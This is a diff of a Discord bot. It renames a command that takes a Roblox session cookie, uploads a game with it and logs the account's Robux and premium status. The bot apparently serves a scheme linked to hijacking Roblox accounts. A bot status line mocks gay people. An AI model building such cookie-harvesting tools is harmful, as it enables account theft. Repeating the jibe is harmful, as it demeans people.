@@ -136,7 +136,7 @@ tree = discord.app_commands.CommandTree(client)
 @client.event
 async def on_ready():
     await tree.sync()
-    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='Your Gay'), status=discord.Status.dnd)
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='You Gay'), status=discord.Status.dnd)
     print('Logged in')
     print('------')
     print(client.user.display_name)
@@ -230,13 +230,13 @@ def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc,
     return apiCheck
 
 @tree.command(
-    name="publish_new_game",
+    name="publish",
     description="Upload a Roblox game to the platform"
 )
 @app_commands.describe(theme='Choose a Theme')
 @app_commands.choices(theme=theme_choices)
 
-async def slash_publish_new_game(interaction: discord.Interaction, theme: discord.app_commands.Choice[str], cookie: str, gamename: str = None, description: str = None):
+async def slash_publish(interaction: discord.Interaction, theme: discord.app_commands.Choice[str], cookie: str, gamename: str = None, description: str = None):
 
   role_name = os.getenv('CUSTUMER_ROLE_NAME')
   guild_id = int(os.getenv("GUILD_ID"))
@@ -397,7 +397,7 @@ async def slash_publish_new_game(interaction: discord.Interaction, theme: discor
         channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))
 
         embed_var = discord.Embed(
-          title="Test MGUI",
+          title="Dashx RGUI",
           description= f'**<@{interaction.user.id}> Successfully Uploaded A New Game**\n\n**Account Information**\n**Account Username -** ' + str(username) + '\n**Account ID - ** ' + str(userid) + '\n**Robux - ** ' + str(user_robux) + '\n**isPremium? - **' + str(user_isprem) + '\n\n**Game Information**\n**Game Name - ||Hidden||**\n**Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
           color=0xfac54d
         )
